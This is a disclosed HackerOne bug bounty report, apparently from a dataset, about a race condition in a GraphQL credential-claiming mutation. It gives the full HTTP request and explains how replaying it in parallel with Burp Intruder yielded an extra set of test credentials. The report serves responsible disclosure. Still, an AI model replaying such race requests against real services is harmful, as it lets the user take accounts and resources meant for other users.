---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '488985'
original_report_id: '488985'
title: Race condition in claiming program credentials
weakness: Time-of-check Time-of-use (TOCTOU) Race Condition
team_handle: security
created_at: '2019-01-31T07:50:00.085Z'
disclosed_at: '2019-05-19T18:23:48.173Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 46
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- time-of-check-time-of-use-toctou-race-condition
---

# Race condition in claiming program credentials

## Metadata

- HackerOne Report ID: 488985
- Weakness: Time-of-check Time-of-use (TOCTOU) Race Condition
- Program: security
- Disclosed At: 2019-05-19T18:23:48.173Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

**Summary:**
I was invited to a private program and I tried to get test credentials so a request as follows was sent to your server:

```
POST /graphql HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 778
Accept: */*
X-Auth-Token: ████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/█████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,he;q=0.8
Cookie: __cfduid=███████; _cfuid=███████; _ga=████; _mkto_trk=id:████████

{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"team_id":"█████=","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}
```

and I then sent this request to burp suite intruder and got 22 responses , 21 of them had the same response as this:

```
{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"██████████","credentials":{"email":"██████","password":"███████","private_id":"██████"},"account_details":null},"id":"██████="},"was_successful":false,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
```

and the last one was holding a different set of credentials as this:

```
{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"███████","credentials":{"email":"████████","password":"███████","private_id":"███"},"account_details":null},"id":"██████████="},"was_successful":true,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
```

in this case I was able to have multiple test credentials and maybe block another user from getting a test account if the program provided a limited amount of test accounts.


thanks!

## Impact

claiming multiple credentials for the same user

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
